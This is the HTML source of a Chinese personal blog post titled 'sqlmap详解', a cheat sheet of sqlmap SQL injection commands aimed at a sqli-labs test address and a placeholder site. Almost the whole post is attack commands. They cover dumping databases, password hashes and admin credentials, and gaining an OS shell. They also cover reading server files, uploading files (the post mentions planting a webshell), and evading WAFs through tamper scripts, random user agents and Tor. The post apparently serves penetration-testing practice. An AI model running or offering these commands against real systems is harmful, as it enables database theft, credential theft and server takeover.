@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <link rel="alternate" href="/atom.xml" title="ClearLoveの博客" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.5.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="1、sqlmap的简单用法sqlmap -r http.txt  #http.txt是我们抓取的http的请求包 sqlmap -r http.txt -p username  #指定参数，当有多个参数而你又知道username参数存在SQL漏洞，你就可以使用-p指定参数进行探测 sqlmap -u &quot;http:&#x2F;&#x2F;192.168.10.1&#x2F;sqli&#x2F;Less-1&#x2F;?id=1&quot;   #探测该url">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlmap详解">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;01&#x2F;13&#x2F;sqlmap%E8%AF%A6%E8%A7%A3&#x2F;index.html">
+<meta property="og:site_name" content="ClearLoveの博客">
+<meta property="og:description" content="1、sqlmap的简单用法sqlmap -r http.txt  #http.txt是我们抓取的http的请求包 sqlmap -r http.txt -p username  #指定参数，当有多个参数而你又知道username参数存在SQL漏洞，你就可以使用-p指定参数进行探测 sqlmap -u &quot;http:&#x2F;&#x2F;192.168.10.1&#x2F;sqli&#x2F;Less-1&#x2F;?id=1&quot;   #探测该url">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2020-01-13T07:52:19.594Z">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://yoursite.com/2020/01/13/sqlmap%E8%AF%A6%E8%A7%A3/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>sqlmap详解 | ClearLoveの博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ClearLoveの博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">我们称之为路的，其实不过是彷徨</p>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/13/sqlmap%E8%AF%A6%E8%A7%A3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="魏超">
+      <meta itemprop="description" content="胡歌">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ClearLoveの博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sqlmap详解
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-01-13 15:05:02 / 修改时间：15:52:19" itemprop="dateCreated datePublished" datetime="2020-01-13T15:05:02+08:00">2020-01-13</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>1、sqlmap的简单用法</p><pre><code>sqlmap -r http.txt  #http.txt是我们抓取的http的请求包
+sqlmap -r http.txt -p username  #指定参数，当有多个参数而你又知道username参数存在SQL漏洞，你就可以使用-p指定参数进行探测
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"   #探测该url是否存在漏洞
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --cookie="抓取的cookie"   #当该网站需要登录时，探测该url是否存在漏洞
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --data="uname=admin&passwd=admin&submit=Submit"  #抓取其post提交的数据填入
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --users      #查看数据库的所有用户
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --passwords  #查看数据库用户名的密码
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --current-user  #查看数据库当前的用户
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --is-dba    #判断当前用户是否有管理员权限
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --roles     #列出数据库所有管理员角色，仅适用于oracle数据库的时候
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"  --dbs        #爆出所有的数据库
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"  --tables     #爆出所有的数据表
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"  --columns    #爆出数据库中所有的列
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"  --current-db #查看当前的数据库
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security --tables #爆出数据库security中的所有的表
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users --columns #爆出security数据库中users表中的所有的列
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users -C username --dump  #爆出数据库security中的users表中的username列中的所有数据
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users --dump-all #爆出数据库security中的users表中的所有数据
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security --dump-all   #爆出数据库security中的所有数据
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --dump-all  #爆出该数据库中的所有数据
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --tamper=space2comment.py  #指定脚本进行过滤，用/**/代替空格
+sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --level=5 --risk=3 #探测等级5，平台危险等级3，都是最高级别。当level=2时，会测试cookie注入。当level=3时，会测试user-agent/referer注入。
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --sql-shell  #执行指定的sql语句
+sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --os-shell/--os-cmd   #执行--os-shell命令，获取目标服务器权限
+sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --file-read "c:/test.txt" #读取目标服务器C盘下的test.txt文件
+sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --file-write  test.txt  --file-dest "e:/hack.txt"  #将本地的test.txt文件上传到目标服务器的E盘下，并且名字为hack.txt
+sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --dbms="MySQL"     #指定其数据库为mysql Firebird, HSQLDB, IBM DB2, Informix, Microsoft Access, Microsoft SQL Server, MySQL, Oracle, PostgreSQL, SAP MaxDB, SQLite, Sybase
+sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --random-agent   #使用任意的User-Agent爆破
+sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --proxy="http://127.0.0.1:8080"    #指定代理
+sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --technique T    #指定时间延迟注入，这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式，当然，我们也可以直接手工指定。
+支持的探测方式如下：
+　　B: Boolean-based blind SQL injection（布尔型注入）
+　　E: Error-based SQL injection（报错型注入）
+　　U: UNION query SQL injection（可联合查询注入）
+　　S: Stacked queries SQL injection（可多语句查询注入）
+　　T: Time-based blind SQL injection（基于时间延迟注入）
+-v3                   #输出详细度  最大值5 会显示请求包和回复包
+--threads 5           #指定线程数
+--fresh-queries       #清除缓存
+--flush-session       #清空会话，重构注入
+--batch               #对所有的交互式的都是默认的
+--random-agent        #任意的http头
+--tamper base64encode            #对提交的数据进行base64编码
+--referer http://www.baidu.com   #伪造referer字段
+--keep-alive     保持连接，当出现 [CRITICAL] connection dropped or unknown HTTP status code received. sqlmap is going to retry the request(s) 保错的时候，使用这个参数</code></pre><a id="more"></a>
+
+<p>2、对于不用登录的网站</p>
+<pre><code>sqlmap -u  "http://192.168.10.1/sqli/Less-1/?id=1" </code></pre>
+<p>3、需要登录的网站<br>sqlmap -u  “<a href="http://192.168.10.1/sqli/Less-1/?id=1&quot;" target="_blank" rel="noopener">http://192.168.10.1/sqli/Less-1/?id=1&quot;</a>   –cookie=”抓取的cookie”<br>4、对于是post提交数据的URL，我们需要指定其data参数</p>
+<pre><code>"http://192.168.10.1/sqli/Less-11/?id=1" --data="uname=admin&passwd=admin&submit=Submit"</code></pre>
+<p>5、查看数据库的用户</p>
+<pre><code>sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --users</code></pre>
+<p>6、查看数据库下所有用户名密码</p>
+<pre><code>sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --passwords</code></pre>
+<p>7、查看当前数据库用户</p>
+<pre><code>sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --current-user</code></pre>
+<p>8、判断当前用户是否有管理权限</p>
+<pre><code>sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --is-dba</code></pre>
+<p>9、列出数据库管理员角色</p>
+<pre><code>sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --roles</code></pre>
+<p>10、查看数据库</p>
+<pre><code>sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --dbs</code></pre>
+<p>11、查看当前数据库</p>
+<pre><code>sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --current-db</code></pre>
+<p>12、查看数据库中所有的表</p>
+<pre><code>sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security --tables</code></pre>
+<p>13、爆出指定数据库中指定表的所有列</p>
+<pre><code>sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users --columns</code></pre>
+<p>14、爆出指定数据库指定列下的数据</p>
+<pre><code>sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users -C username --dump</code></pre>
+<p>15、爆出该网站数据库中的所有数据</p>
+<pre><code>sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users --dump-all #爆出数据库security中的users表中的所有数据
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security --dump-all   #爆出数据库security中的所有数据
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --dump-all  #爆出该数据库中的所有数据</code></pre>
+<p>16、利用sqlmap 获取管理员账号密码</p>
+<pre><code>1.获取库名  
+python2 sqlmap.py -u "http://xxx.com" --dbs
+2.继续获取表名
+python2 sqlmap.py -u "http://xxx.com" -D 库名 --tables
+3.获取字段名
+python2 sqlmap.py -u "http://xxx.com" -D 库名 -T admin --columns
+4.获取用户名，密码
+python2 sqlmap.py -u "http://xxx.com" -D 库名 -T admin -C admin_name,admin_pass --dump
+</code></pre>
+<p>17、sqlmap的高级用法</p>
+<pre><code>--identify-waf   检测是否有WAF #使用参数进行绕过
+--random-agent    使用任意HTTP头进行绕过，尤其是在WAF配置不当的时候
+--time-sec=3      使用长的延时来避免触发WAF的机制，这方式比较耗时
+--hpp             使用HTTP 参数污染进行绕过，尤其是在ASP.NET/IIS 平台上
+--proxy=100.100.100.100:8080 --proxy-cred=211:985      使用代理进行绕过
+--ignore-proxy    禁止使用系统的代理，直接连接进行注入
+--flush-session   清空会话，重构注入
+--hex 或者 --no-cast     进行字符码转换
+--mobile          对移动端的服务器进行注入
+--tor             匿名注入
+sqlmap  --tamper=space2comment.py  #用/**/代替空格
+sqlmap  --tamper="space2comment.py,space2plus.py"  指定多个脚本进行过滤
+详情见https://mp.weixin.qq.com/s/AJCl50QG7FRtaIllMoImbA
+</code></pre>
+<p>18、执行指定的SQL语句</p>
+<pre><code>sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --sql-shell</code></pre>
+<p>19、执行操作系统命令</p>
+<pre><code>在数据库为Mysql、PostgreSql或者SQL Server时，当满足下面三个条件，我们就可以执行操作系统命令
+网站必须是root权限
+攻击者需要知道网站的绝对路径
+GPC为off，php主动转义的功能关闭
+sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --os-shell
+</code></pre>
+<p>20、从数据库中读取文件</p>
+<pre><code>当数据库为Mysql、PostgreSQL或SQL Server，并且当前用户有权限时，可以读取指定文件，可以是文本文件或者二进制文件。
+sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --file-read "c:/test.txt"</code></pre>
+<p>21、上传文件到数据库服务器中</p>
+<pre><code>当数据库为Mysql、Postgre SQL或者Sql Server，并且当前用户有权限使用特定的函数时，可以上传文件到数据库服务器。文件可以是文本，也可以是二进制文件。
+所以利用上传文件，我们可以上传一句话木马或者上传shell上去
+sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --file-write test.txt --file-dest "e:/hack.txt"</code></pre>
+
+
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+                <a href="/2020/01/09/phpMYAdmin%E6%8F%90%E6%9D%83/" rel="next" title="phpMYAdmin提权">
+                  <i class="fa fa-chevron-left"></i> phpMYAdmin提权
+                </a>
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+            </div>
+          </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="魏超"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">魏超</p>
+  <div class="site-description" itemprop="description">胡歌</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">魏超</span>
+</div>
+  <!--<div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v4.0.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.5.0
+  </div>
+--!>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/clicklove.js"></script>
